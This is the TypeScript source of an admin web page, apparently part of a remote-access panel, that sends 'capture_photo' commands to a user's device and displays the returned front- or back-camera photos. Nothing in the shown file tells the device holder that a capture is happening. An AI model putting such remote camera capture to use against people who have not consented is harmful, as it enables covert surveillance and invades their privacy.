'use client';
import { useEffect, useState, useCallback, useRef } from 'react';
import { useParams, useRouter } from 'next/navigation';
import {
  ArrowLeft, Camera, Loader, AlertCircle, Download,
  Clock, RefreshCw, Wifi, WifiOff,
} from 'lucide-react';
import { adminApi } from '@/lib/adminApi';
import PageLoader from '@/components/PageLoader';

interface Cmd {
  id: string; commandType: string; payload: string;
  status: string; result: string | null;
  issuedAt: string; completedAt: string | null;
}
interface DeviceInfo { deviceId: string; name: string; isOnline: boolean; }

function parseResult(raw: string | null) {
  if (!raw) return null;
  try { return JSON.parse(raw); } catch { return null; }
}

const STATUS: Record<string, { label: string; color: string; dot: string }> = {
  pending:   { label: 'Waiting for device…', color: 'text-yellow-400', dot: 'bg-yellow-400 animate-pulse' },
  delivered: { label: 'Delivered',            color: 'text-blue-400',   dot: 'bg-blue-400 animate-pulse' },
  executing: { label: 'Executing…',           color: 'text-indigo-400', dot: 'bg-indigo-400 animate-pulse' },
  completed: { label: 'Completed',            color: 'text-green-400',  dot: 'bg-green-400' },
  failed:    { label: 'Failed',               color: 'text-red-400',    dot: 'bg-red-500' },
  cancelled: { label: 'Cancelled',            color: 'text-gray-500',   dot: 'bg-gray-500' },
};

function fmtTime(s: string) {
  return new Date(s).toLocaleString('en-IN', { dateStyle: 'short', timeStyle: 'medium' });
}

function PhotoCard({ cmd }: { cmd: Cmd }) {
  const result  = parseResult(cmd.result);
  const st      = STATUS[cmd.status] ?? STATUS.pending;
  const payload = (() => { try { return JSON.parse(cmd.payload); } catch { return {}; } })();
  const isPending = ['pending','delivered','executing'].includes(cmd.status);

  return (
    <div className="bg-gray-900 border border-gray-800 rounded-2xl overflow-hidden">
      <div className="flex items-center justify-between px-4 py-3 border-b border-gray-800">
        <div className="flex items-center gap-2">
          <Camera size={14} className="text-pink-400" />
          <span className="text-white text-xs font-semibold capitalize">
            {payload.camera ?? 'back'} camera
          </span>
        </div>
        <div className="flex items-center gap-2">
          <span className={`w-2 h-2 rounded-full ${st.dot}`} />
          <span className={`text-xs font-medium ${st.color}`}>{st.label}</span>
        </div>
      </div>

      {result?.type === 'photo' && result.data ? (
        <div className="relative">
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img src={`data:${result.mimeType ?? 'image/jpeg'};base64,${result.data}`}
            alt="Captured" className="w-full max-h-96 object-contain bg-black" />
          <a href={`data:${result.mimeType ?? 'image/jpeg'};base64,${result.data}`}
            download={`photo_${cmd.id.slice(0,8)}.jpg`}
            className="absolute bottom-3 right-3 flex items-center gap-1.5 bg-black/60 hover:bg-black/80 text-white text-xs px-3 py-1.5 rounded-full transition-colors">
            <Download size={12} /> Save
          </a>
        </div>
      ) : isPending ? (
        <div className="flex flex-col items-center justify-center py-12 gap-3 text-gray-500">
          <div className="w-12 h-12 border-4 border-pink-900 border-t-pink-500 rounded-full animate-spin" />
          <p className="text-sm">Waiting for device to capture…</p>
          <p className="text-xs text-gray-600">Device checks every ~1 min</p>
        </div>
      ) : result?.type === 'error' ? (
        <div className="flex items-center gap-2 px-4 py-6 text-red-400 text-sm">
          <AlertCircle size={16} /> {String(result.message ?? 'Capture failed')}
        </div>
      ) : (
        <div className="px-4 py-6 text-gray-600 text-sm">No result yet</div>
      )}

      <div className="px-4 py-2 text-gray-600 text-xs border-t border-gray-800">
        {fmtTime(cmd.issuedAt)}
        {cmd.completedAt && ` · Done: ${fmtTime(cmd.completedAt)}`}
      </div>
    </div>
  );
}

export default function AdminRemoteCameraPage() {
  const { userId, deviceId } = useParams<{ userId: string; deviceId: string }>();
  const router = useRouter();

  const [device, setDevice]     = useState<DeviceInfo | null>(null);
  const [commands, setCommands] = useState<Cmd[]>([]);
  const [busy, setBusy]         = useState<string | null>(null);
  const [loading, setLoading]   = useState(true);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    adminApi.userDetail(userId).then((r) => {
      setDevice(r.data.devices?.find((d: DeviceInfo) => d.deviceId === deviceId) ?? null);
    }).catch(() => {});
  }, [userId, deviceId]);

  const fetchCmds = useCallback(async () => {
    try {
      const r = await adminApi.deviceCommands(deviceId);
      setCommands((r.data as Cmd[]).filter((c) => c.commandType === 'capture_photo'));
    } catch {}
  }, [deviceId]);

  useEffect(() => {
    setLoading(true);
    fetchCmds().finally(() => setLoading(false));
    pollRef.current = setInterval(fetchCmds, 2000);
    return () => { if (pollRef.current) clearInterval(pollRef.current); };
  }, [fetchCmds]);

  async function send(facing: 'back' | 'front') {
    setBusy(facing);
    try {
      await adminApi.issueCommand(deviceId, 'capture_photo', { camera: facing });
      await fetchCmds();
    } finally { setBusy(null); }
  }

  return (
    <div className="flex-1 flex flex-col min-h-0">
      {/* Header */}
      <div className="px-8 pt-8 pb-5 border-b border-gray-800">
        <button onClick={() => router.push(`/admin/users/${userId}/remote/${deviceId}`)}
          className="flex items-center gap-2 text-gray-400 hover:text-white text-sm mb-4 transition-colors">
          <ArrowLeft size={15} /> Remote Access
        </button>
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-pink-500/20 rounded-xl flex items-center justify-center">
              <Camera size={20} className="text-pink-400" />
            </div>
            <div>
              <h1 className="text-xl font-extrabold text-white">Camera Capture</h1>
              <div className="flex items-center gap-2 mt-0.5">
                <span className="text-gray-400 text-sm">{device?.name ?? deviceId}</span>
                {device?.isOnline
                  ? <span className="flex items-center gap-1 text-green-400 text-xs"><Wifi size={11} /> Live</span>
                  : <span className="flex items-center gap-1 text-gray-500 text-xs"><WifiOff size={11} /> Offline</span>}
              </div>
            </div>
          </div>
          <button onClick={fetchCmds} className="text-gray-600 hover:text-gray-300 transition-colors">
            <RefreshCw size={15} />
          </button>
        </div>
      </div>

      <div className="flex-1 overflow-y-auto p-8 space-y-6">
        {/* Action buttons */}
        <div className="flex gap-3 flex-wrap">
          {([
            { label: '📷 Capture Back Camera',  facing: 'back'  as const, color: 'bg-pink-600 hover:bg-pink-700' },
            { label: '🤳 Capture Front Camera', facing: 'front' as const, color: 'bg-purple-600 hover:bg-purple-700' },
          ] as const).map((btn) => (
            <button key={btn.facing} onClick={() => send(btn.facing)} disabled={!!busy}
              className={`flex items-center gap-2 px-5 py-3 rounded-2xl text-white font-bold text-sm transition-all active:scale-95 disabled:opacity-60 shadow-lg ${btn.color}`}>
              {busy === btn.facing ? <Loader size={16} className="animate-spin" /> : <Camera size={16} />}
              {btn.label}
            </button>
          ))}
        </div>

        <div className="bg-gray-900 border border-gray-800 rounded-xl px-4 py-3 text-xs text-gray-500 flex items-start gap-2">
          <Clock size={13} className="mt-0.5 flex-shrink-0 text-gray-600" />
          After sending, the device captures on its next poll cycle (≤1 min). Photo appears below automatically — no refresh needed.
        </div>

        {loading ? (
          <PageLoader theme="dark" />
        ) : commands.length === 0 ? (
          <div className="text-center py-16 text-gray-600">
            <Camera size={40} className="mx-auto mb-3 opacity-20" />
            <p>No photos yet. Click a button above to capture.</p>
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {commands.map((cmd) => <PhotoCard key={cmd.id} cmd={cmd} />)}
          </div>
        )}
      </div>
    </div>
  );
}
